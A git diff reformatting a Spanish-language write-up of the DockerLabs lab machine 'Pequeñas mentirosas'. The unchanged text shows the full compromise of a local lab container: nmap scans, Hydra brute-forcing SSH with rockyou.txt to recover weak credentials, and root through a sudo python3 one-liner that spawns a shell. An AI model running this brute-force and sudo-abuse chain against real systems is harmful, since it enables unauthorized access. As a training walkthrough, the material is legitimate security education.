@@ -1,22 +1,30 @@
-# 🖥️ Writeup - Pequeñas mentirosas 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# Pequeñas-mentirosas ​​
+
+## 🖥️ Writeup - Pequeñas mentirosas
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Web` `OSINT` `Hydra` `Weak Credentials` `Lateral Movement` `Sudoers` `Python`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip pequenas-mentirosas.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh pequenas-mentirosas.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-12 16:46 CEST
 Nmap scan report for 172.17.0.2
@@ -90,7 +99,7 @@ Realizamos `fuzzing` de directorios para intentar descubrir directorios o archiv
 
 Buscando por internet, descubrimos que `A` es un personaje de la serie `Pequeñas Mentirosas`, por lo que podría ser un usuario del sistema.
 
-# FUERZA BRUTA
+## FUERZA BRUTA
 
 Intentamos un ataque de fuerza bruta con `Hydra` sobre el puerto `22` (`SSH`).
 
@@ -99,6 +108,7 @@ hydra -l a -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
 ```
 
 Info:
+
 ```
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -114,7 +124,7 @@ Encontramos credenciales para el usuario `a` : `secret`.
 
 Accedemos por SSH.
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Una vez dentro, comprobamos permisos `sudo`, `SUID`, `Capabilities`.
 
@@ -141,11 +151,12 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-12 16:59:
 
 Una vez autenticados como `spencer`, comprobamos permisos `sudo`, `SUID` y `Capabilities`.
 
-```bash 
+```bash
 sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for spencer on a2cca82350e8:
     env_reset, mail_badpass,
@@ -162,6 +173,7 @@ sudo python3 -c 'import os; os.system("/bin/sh")'
 ```
 
 Info:
+
 ```
 # whoami
 root
